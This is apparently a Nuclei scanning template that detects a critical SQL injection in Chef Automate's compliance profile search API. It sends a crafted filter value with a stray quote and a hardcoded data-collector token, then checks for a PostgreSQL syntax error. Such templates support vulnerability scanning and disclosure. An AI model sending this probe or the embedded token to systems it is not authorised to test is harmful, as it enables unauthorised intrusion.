id: sql-injection-chef-automate

info:
  name: Chef Automate SQL injection
  author: 3th1c_yuk1,xbow
  severity: critical
  description: |
    SQL injection vulnerability in chef automate
  reference: |
    https://xbow.com/blog/cooking-an-sql-injection-vulnerability-in-chef-automate

http:
  - raw:
      - |
        POST /api/v0/compliance/profiles/search HTTP/1.1
        Host: {{BaseURL}}
        Content-Type: application/json
        x-data-collector-token: 93a49a4f2482c64126f7b6015e6b0f30284287ee4054ff8807fb63d9cbd1c506

        {"filters": [{"type": "name'", "values": ["test"]}]}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "pq: syntax error"
        part: body